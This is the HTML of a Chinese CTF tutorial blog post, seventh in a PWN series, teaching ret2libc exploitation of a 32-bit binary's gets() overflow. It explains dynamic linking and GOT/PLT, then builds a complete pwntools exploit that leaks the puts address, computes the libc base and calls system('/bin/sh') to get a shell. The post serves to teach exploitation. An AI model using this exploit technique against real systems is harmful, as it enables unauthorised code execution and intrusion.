@@ -1,0 +1,429 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>PWN从入门到放弃(7)——栈溢出之ret2libc | 山深有杏&#39;s Blog</title>
+<link rel="shortcut icon" href="https://ssyxsec.com/favicon.ico?v=1735101861265">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://ssyxsec.com/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="PWN从入门到放弃(7)——栈溢出之ret2libc | 山深有杏&#39;s Blog - Atom Feed" href="https://ssyxsec.com/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="之前我们介绍了ret2text和ret2shellcode，这篇给大家介绍一下ret2libc。
+ret2libc这种攻击方式主要是针对动态链接(Dynamic linking) 编译的程序，因为正常情况下是无法在程序中找到像 system..." />
+    <meta name="keywords" content="CTF,Pwn" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://ssyxsec.com">
+  <img class="avatar" src="https://ssyxsec.com/images/avatar.png?v=1735101861265" alt="">
+  </a>
+  <h1 class="site-title">
+    山深有杏&#39;s Blog
+  </h1>
+  <p class="site-description">
+    These Violent Delights Have Violent Ends.
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="https://ssyxsec.com/0mQfqrf6-n" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              PWN从入门到放弃(7)——栈溢出之ret2libc
+            </h2>
+            <div class="post-info">
+              <span>
+                2024-11-07
+              </span>
+              <span>
+                12 min read
+              </span>
+              
+                <a href="https://ssyxsec.com/tag/mFiLVoNunh/" class="post-tag">
+                  # CTF
+                </a>
+              
+                <a href="https://ssyxsec.com/tag/BcBYBpcwgI/" class="post-tag">
+                  # Pwn
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <p>之前我们介绍了ret2text和ret2shellcode，这篇给大家介绍一下ret2libc。</p>
+<p>ret2libc这种攻击方式主要是针对动态链接(Dynamic linking) 编译的程序，因为正常情况下是无法在程序中找到像 system() 、execve() 这种系统级函数(如果程序中直接包含了这种函数就可以直接控制返回地址指向他们，而不用通过这种麻烦的方式)。</p>
+<h3 id="0x00-动态链接">0x00 动态链接</h3>
+<h4 id="什么是动态链接">什么是动态链接</h4>
+<p><strong>动态链接是</strong>指在程序装载时通过<strong>动态链接器</strong>将程序所需的所有<strong>动态链接(Dynamic linking library)</strong> 装载至进程空间中（ 程序按照模块拆分成各个相对独立的部分），当程序运行时才将他们链接在一起形成一个完整程序的过程。</p>
+<p>它诞生的最主要的的原因就是<strong>静态链接</strong>太过于浪费内存和磁盘的空间，并且现在的软件开发都是模块化开发，不同的模块都是由不同的厂家开发，在<strong>静态链接</strong>的情况下，一旦其中某一模块发生改变就会导致整个软件都需要重新编译，而通过<strong>动态链接</strong>的方式就推迟这个链接过程到了程序运行时进行。</p>
+<h4 id="动态链接的好处">动态链接的好处</h4>
+<h5 id="节省内存-磁盘空间">节省内存、磁盘空间</h5>
+<p>例如磁盘中有两个程序，p1、p2，且他们两个都包含lib.o这个模块，在<strong>静态链接</strong>的情况下他们在链接输出可执行文件时都会包含lib.o这个模块，这就造成了磁盘空间的浪费。当这两个程序运行时，内存中同样也就包含了这两个相同的模块，这也就使得内存空间被浪费。当系统中包含大量类似lib.o这种被多个程序共享的模块时，也就会造成很大空间的浪费。在<strong>动态链接</strong>的情况下，运行p1，当系统发现需要用到lib.o，就会接着加载lib.o。这时我们运行p2，就不需要重新加载lib.o了，因为此时lib.o已经在内存中了，系统仅需将两者链接起来，此时内存中就只有一个lib.o节省了内存空间。</p>
+<h5 id="程序更新更简单">程序更新更简单</h5>
+<p>第三方更新lib.o后，理论上只需要覆盖掉原有的lib.o，就不必重新链接整个程序，在程序下一次运行时，新版本的目标文件就会自动装载到内存并且链接起来，就完成了升级的目标。</p>
+<h5 id="增强程序扩展性和兼容性">增强程序扩展性和兼容性</h5>
+<p><strong>动态链接</strong>的程序在运行时可以动态地选择加载各种模块，也就是我们常常使用的插件。软件的开发商开发某个产品时会按照一定的规则制定好程序的接口，其他开发者就可以通过这种接口来编写符合要求的<strong>动态链接文件</strong>，以此来实现程序功能的扩展。增强兼容性是表现在<strong>动态链接</strong>的程序对不同平台的依赖差异性降低，比如对某个函数的实现机制不同，如果是<strong>静态链接</strong>的程序会为不同平台发布不同的版本，而在<strong>动态链接</strong>的情况下，只要不同的平台都能提供一个动态链接库包含该函数且接口相同，就只需用一个版本了。</p>
+<p>总而言之，<strong>动态链接</strong>的程序在运行时会根据自己所依赖的<strong>动态链接库</strong>，通过<strong>动态链接器</strong>将他们加载至内存中，并在此时将他们链接成一个完整的程序。Linux系统中，ELF动态链接文件被称为<strong>动态共享对象（Dynamic Shared Objects）</strong>，简称<strong>共享对象</strong>一般都是以 “.so” 为扩展名的文件，在pwn中我们常称之为<strong>libc库</strong>；在windows系统中就是常常软件报错缺少xxx.dll文件。</p>
+<h3 id="0x01-got表plt表">0x01 GOT表&amp;PLT表</h3>
+<p>GOT（Global Offset Table，全局偏移表）是Linux ELF文件中用于定位全局变量和函数的一个表。PLT（Procedure Linkage Table，过程链接表）是Linux ELF文件中用于延迟绑定的表，即函数第一次被调用的时候才进行绑定。</p>
+<h4 id="延迟绑定">延迟绑定</h4>
+<p>所谓延迟绑定，就是当函数第一次被调用的时候才进行绑定（包括符号查找、重定位等），如果函数从来没有用到过就不进行绑定。基于延迟绑定可以大大加快程序的启动速度，特别有利于一些引用了大量函数的程序。</p>
+<h4 id="延迟绑定的基本原理">延迟绑定的基本原理</h4>
+<p>假如存在一个puts函数，这个函数在PLT中的条目为puts@plt，在GOT中的条目为puts@got，那么在第一次调用puts函数的时候，首先会跳转到PLT表，伪代码如下：</p>
+<pre><code class="language-javascript">puts@plt:
+    jmp puts@got
+    patch puts@got
+</code></pre>
+<p>这里会从PLT跳转到GOT，如果函数从来没有调用过，那么这时候GOT会跳转回PLT并调用patch puts@got，这一行代码的作用是将puts函数真正的地址填充到puts@got，然后跳转到puts函数真正的地址执行代码。当我们下次再调用puts函数的时候，执行路径就是先后跳转到puts@plt、puts@got、puts真正的地址。</p>
+<p>也就是说，PLT表和GOT表是一一对应的，GOT表中存的是函数的实际地址，而PLT表中存的是函数GOT表的地址。</p>
+<p>​</p>
+<h3 id="0x02-ret2libc">0x02 ret2libc</h3>
+<p>一般来说，在我们做题的时候，会给两个文件，一个是elf程序文件，另一个则是libc库文件。不过有的题目也不会给出libc库，需要我们根据函数在libc库中的偏移量来查找对应的libc库。</p>
+<h4 id="计算libc基址">计算libc基址</h4>
+<p>libc基地址 = 函数实际地址 – 函数在libc库中的偏移地址</p>
+<p>system_addr = libc基地址 + system在libc库中的偏移地址</p>
+<h4 id="利用ret2libc需解决的问题">利用ret2libc需解决的问题</h4>
+<ul>
+<li>程序中有可输出地址内容的函数，如：puts()；</li>
+<li>计算libc基址；</li>
+<li>找到 system() 函数的地址；</li>
+<li>找到 “/bin/sh” 这个字符串的地址。</li>
+</ul>
+<h3 id="0x03-例题">0x03 例题</h3>
+<h4 id="1-查看文件信息">1) 查看文件信息</h4>
+<p>按照国际惯例，先查看文件信息</p>
+<pre><code class="language-javascript">$ file diqiandao
+$ checksec diqiandao
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://ssyxsec.com/post-images/1730953421157.png" alt="" loading="lazy"></figure>
+<p>32位程序，开启了NX保护。</p>
+<h4 id="2-查看程序流程">2) 查看程序流程</h4>
+<p>运行一下程序，看看程序的大概流程</p>
+<figure data-type="image" tabindex="2"><img src="https://ssyxsec.com/post-images/1730953428401.png" alt="" loading="lazy"></figure>
+<p>程序获取一次用户输入</p>
+<h4 id="3-分析程序查找漏洞点">3) 分析程序&amp;查找漏洞点</h4>
+<p>将程序扔到ida pro里分析</p>
+<p>首先分析main()函数</p>
+<pre><code class="language-javascript">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char s; // [esp+1Ch] [ebp-64h]
+
+  setvbuf(stdout, 0, 2, 0);
+  setvbuf(stdin, 0, 1, 0);
+  puts(&quot;No surprise anymore, system disappeard QQ.&quot;);
+  printf(&quot;Can you find it !?&quot;);
+  gets(&amp;s);
+  return 0;
+}
+</code></pre>
+<p>我们看到main()函数中，有puts()函数和gets()函数，这里gets()函数是存在溢出的，我们可以利用这个溢出，构造一个puts()函数，将函数实际地址打印出来。</p>
+<p>但是这里存在一个问题，我们这个程序只提供一次用户输入，而我们至少需要两次输入（一次用来获取函数实际地址，一次用来发送payload）。所以，我们构造puts()函数时需要加上返回地址，返回到main()函数，让我们可以再次输入。</p>
+<h4 id="4-构造payload">4) 构造payload</h4>
+<p>首先，和之前一样，简单的栈溢出，只不过返回到puts()函数上，顺便加上puts()函数的参数。</p>
+<pre><code class="language-javascript">from pwn import *
+
+r = process('./diqiandao')
+elf = ELF('./diqiandao')
+libc = ELF('/lib/i386-linux-gnu/libc.so.6')
+
+main_addr = 0x08048618
+puts_plt = elf.plt['puts']
+puts_got = elf.got['puts']
+
+padding = 112
+
+payload = 'a' * padding
+payload += p32(puts_plt)
+payload += p32(main_addr)
+payload += p32(puts_got)
+
+r.sendlineafter('?',payload)
+
+r.interactive()
+</code></pre>
+<p>**注：**这里需要注意一下，在本地调试的时候，程序调用的libc库是当前虚拟机的libc库，因此，写payload的时候，需要导入虚拟机的libc库，而不是题目给出的libc库。在本地调试成功后，将libc库换成题目给的，然后执行脚本即可。</p>
+<p>这里可使用ldd命令来查看当前程序所使用的libc库地址。</p>
+<figure data-type="image" tabindex="3"><img src="https://ssyxsec.com/post-images/1730953449059.png" alt="" loading="lazy"></figure>
+<p>计算偏移量和覆盖返回地址不再演示，和之前一样，这里主要讲解一下payload的构造。</p>
+<p>32位ELF程序通过栈来传递参数，而64位ELF程序则是通过rdi寄存器来传递参数。</p>
+<p>这道题是32位ELF程序，因此，我们需要构造一个栈结构。之前我们讲过栈帧的结构，我们只需要按照栈帧结构来构造即可。先构造main()函数，造成溢出，然后构造puts()函数。</p>
+<figure data-type="image" tabindex="4"><img src="https://ssyxsec.com/post-images/1730953457628.png" alt="" loading="lazy"></figure>
+<p>只需要按照1，2，3，4的顺序来写payload。</p>
+<p>先来运行一下脚本。</p>
+<figure data-type="image" tabindex="5"><img src="https://ssyxsec.com/post-images/1730953467621.png" alt="" loading="lazy"></figure>
+<p>可以看到，已经给我们打印了一个二进制格式的数据，这就是puts()函数给我们返回的puts@got的值，也就是puts函数的实际地址。我们只需要将其u32解包就可以得到一个16进制地址。</p>
+<p>程序执行完puts()函数之后也成功返回到main()函数，我们可以再次利用main()函数的栈溢出漏洞来进行第二段payload的发送。</p>
+<p>接下来我们继续构造我们的payload。</p>
+<p>首先将地址解包，这里我们需要用到pwntools的recv()。</p>
+<pre><code class="language-javascript">puts_real_addr = u32(r.recv(4))
+print hex(puts_real_addr)
+</code></pre>
+<p>因为32位程序的地址是4个字节，因此我们这里r.recv(4)表示接收4个字节的数据，并通过u32()来解包。</p>
+<p>​</p>
+<p>我们已经成功将puts函数的实际地址打印出来。</p>
+<p>那么接下来就简单许多，我们需要计算libc的基地址，并利用libc基地址来计算system()函数和/bin/sh字符串的地址。然后利用mian()函数的栈溢出漏洞，溢出到我们构造好的system()函数上即可。</p>
+<p>先计算libc基地址，并打印一下看看。</p>
+<pre><code class="language-javascript">libc_base = puts_real_addr - libc.symbols['puts']
+print hex(libc_base)
+</code></pre>
+<figure data-type="image" tabindex="6"><img src="https://ssyxsec.com/post-images/1730953478253.png" alt="" loading="lazy"></figure>
+<p>我们看到，打印出来的libc基地址后三位是0，证明我们没有计算错误，若后三位不是0，说明计算的有问题。</p>
+<p>接下来计算system()和/bin/sh的地址。</p>
+<pre><code class="language-javascript">system_addr = libc_base + libc.symbols['system']
+bin_sh_addr = libc_base + libc.search('/bin/sh').next()
+</code></pre>
+<p>这两个地址大家记住就好，所有题都可以这么写。</p>
+<p>接下来构造system()函数，和puts()函数一样，system()函数也只有一个参数，因为这里不需要再次返回到main()函数，所以返回地址我们可以随便写。</p>
+<pre><code class="language-javascript">payload_2 = 'a' * padding
+payload_2 += p32(system_addr)
+payload_2 += p32(0xdeedbeef)
+payload_2 += p32(bin_sh_addr)
+
+sleep(1)
+r.sendline(payload_2)
+</code></pre>
+<p>我们运行一下脚本</p>
+<figure data-type="image" tabindex="7"><img src="https://ssyxsec.com/post-images/1730953514030.png" alt="" loading="lazy"></figure>
+<p>我们看到程序异常退出了，并没有给我们返回shell，这里我们用gdb动态调试一下。</p>
+<p>在脚本前加上这两句，并在运行脚本时加上G，即可开启动态调试。</p>
+<pre><code class="language-javascript">context.terminal = ['tmux', 'splitw', '-h']
+if args.G:
+        gdb.attach(proc.pidof(r)[0])
+</code></pre>
+<pre><code class="language-javascript">$ python exp.py G
+</code></pre>
+<figure data-type="image" tabindex="8"><img src="https://ssyxsec.com/post-images/1730953520995.png" alt="" loading="lazy"></figure>
+<p>pwntools会自动在新的终端窗口中帮我们开启GDB动态调试。</p>
+<p>**注：**这里大家要是不能开启新窗口，请下载安装tmux，或者根据你当前的终端来修改context.terminal的参数。</p>
+<p>我们在GDB窗口中输入c，让脚本继续运行。</p>
+<p>​</p>
+<p>我们看到程序在一个奇怪的地址被中断了。我们查看寄存器窗口，EIP指向0x61616161，也就是’aaaa’，我们再看堆栈窗口</p>
+<pre><code class="language-javascript">00:0000│ esp  0xffb87b38 ◂— 0x61616161 ('aaaa')
+01:0004│      0xffb87b3c —▸ 0xf75ebda0 (system) ◂— sub    esp, 0xc
+02:0008│      0xffb87b40 ◂— 0xdeadbeef
+03:000c│      0xffb87b44 —▸ 0xf770ca0b ◂— das     /* '/bin/sh' */
+04:0010│      0xffb87b48 —▸ 0xf7763000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0
+05:0014│      0xffb87b4c —▸ 0xf77abc04 ◂— 0x0
+06:0018│      0xffb87b50 —▸ 0xf77ab000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x23f40
+07:001c│      0xffb87b54 ◂— 0x0
+</code></pre>
+<p>esp寄存器当前指向也是0x61616161，也是’aaaa’，再往下就是我们构造的payload_2，也就是说，我们第二次调用main()函数时，他的偏移量不是之前的112了，而是112-8，我们修改一下payload_2</p>
+<pre><code class="language-javascript">payload_2 = 'a' * (padding - 8)
+payload_2 += p32(system_addr)
+payload_2 += p32(0xdeedbeef)
+payload_2 += p32(bin_sh_addr)
+
+sleep(1)
+r.sendline(payload_2)
+</code></pre>
+<p>执行脚本</p>
+<figure data-type="image" tabindex="9"><img src="https://ssyxsec.com/post-images/1730953531181.png" alt="" loading="lazy"></figure>
+<p>成功拿到shell。</p>
+<h3 id="0x04-完整exp">0x04 完整exp</h3>
+<pre><code class="language-javascript">from pwn import *
+
+context.terminal = ['tmux', 'splitw', '-h']
+r = process('./diqiandao')
+elf = ELF('./diqiandao')
+libc = ELF('/lib/i386-linux-gnu/libc.so.6')
+
+if args.G:
+        gdb.attach(proc.pidof(r)[0])
+
+main_addr = 0x08048618
+puts_plt = elf.plt['puts']
+puts_got = elf.got['puts']
+#puts_addr = elf.symbols['puts']
+
+padding = 112
+
+payload = 'a' * padding
+payload += p32(puts_plt)
+payload += p32(main_addr)
+payload += p32(puts_got)
+
+r.sendlineafter('?',payload)
+
+puts_real_addr = u32(r.recv(4))
+#print hex(puts_real_addr)
+
+libc_base = puts_real_addr - libc.symbols['puts']
+print hex(libc_base)
+
+system_addr = libc_base + libc.symbols['system']
+bin_sh_addr = libc_base + libc.search('/bin/sh').next()
+
+payload_2 = 'a' * (padding - 8)
+payload_2 += p32(system_addr)
+payload_2 += p32(0xdeedbeef)
+payload_2 += p32(bin_sh_addr)
+
+sleep(1)
+r.sendline(payload_2)
+
+r.interactive()
+</code></pre>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li>
+<ul>
+<li><a href="#0x00-%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5">0x00 动态链接</a>
+<ul>
+<li><a href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5">什么是动态链接</a></li>
+<li><a href="#%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E7%9A%84%E5%A5%BD%E5%A4%84">动态链接的好处</a>
+<ul>
+<li><a href="#%E8%8A%82%E7%9C%81%E5%86%85%E5%AD%98-%E7%A3%81%E7%9B%98%E7%A9%BA%E9%97%B4">节省内存、磁盘空间</a></li>
+<li><a href="#%E7%A8%8B%E5%BA%8F%E6%9B%B4%E6%96%B0%E6%9B%B4%E7%AE%80%E5%8D%95">程序更新更简单</a></li>
+<li><a href="#%E5%A2%9E%E5%BC%BA%E7%A8%8B%E5%BA%8F%E6%89%A9%E5%B1%95%E6%80%A7%E5%92%8C%E5%85%BC%E5%AE%B9%E6%80%A7">增强程序扩展性和兼容性</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#0x01-got%E8%A1%A8plt%E8%A1%A8">0x01 GOT表&amp;PLT表</a>
+<ul>
+<li><a href="#%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A">延迟绑定</a></li>
+<li><a href="#%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86">延迟绑定的基本原理</a></li>
+</ul>
+</li>
+<li><a href="#0x02-ret2libc">0x02 ret2libc</a>
+<ul>
+<li><a href="#%E8%AE%A1%E7%AE%97libc%E5%9F%BA%E5%9D%80">计算libc基址</a></li>
+<li><a href="#%E5%88%A9%E7%94%A8ret2libc%E9%9C%80%E8%A7%A3%E5%86%B3%E7%9A%84%E9%97%AE%E9%A2%98">利用ret2libc需解决的问题</a></li>
+</ul>
+</li>
+<li><a href="#0x03-%E4%BE%8B%E9%A2%98">0x03 例题</a>
+<ul>
+<li><a href="#1-%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6%E4%BF%A1%E6%81%AF">1) 查看文件信息</a></li>
+<li><a href="#2-%E6%9F%A5%E7%9C%8B%E7%A8%8B%E5%BA%8F%E6%B5%81%E7%A8%8B">2) 查看程序流程</a></li>
+<li><a href="#3-%E5%88%86%E6%9E%90%E7%A8%8B%E5%BA%8F%E6%9F%A5%E6%89%BE%E6%BC%8F%E6%B4%9E%E7%82%B9">3) 分析程序&amp;查找漏洞点</a></li>
+<li><a href="#4-%E6%9E%84%E9%80%A0payload">4) 构造payload</a></li>
+</ul>
+</li>
+<li><a href="#0x04-%E5%AE%8C%E6%95%B4exp">0x04 完整exp</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://ssyxsec.com/Yhk9EnYl-3/">
+              <h3 class="post-title">
+                PWN从入门到放弃(6)——栈溢出之ret2shellcode
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://ssyxsec.com/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
